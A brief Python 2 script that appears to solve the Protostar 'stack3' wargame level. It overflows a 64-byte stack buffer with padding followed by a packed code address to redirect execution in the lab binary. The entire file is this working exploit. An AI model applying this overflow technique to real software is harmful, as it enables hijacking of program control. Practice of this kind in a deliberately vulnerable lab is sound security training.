#!/usr/bin/env python2.6

import struct

flag = struct.pack("I", 0x08048424)

payload = "A" * 64 + "".join(flag)

import utils

utils.run_file_with_stdin("/opt/protostar/bin/stack3", payload)
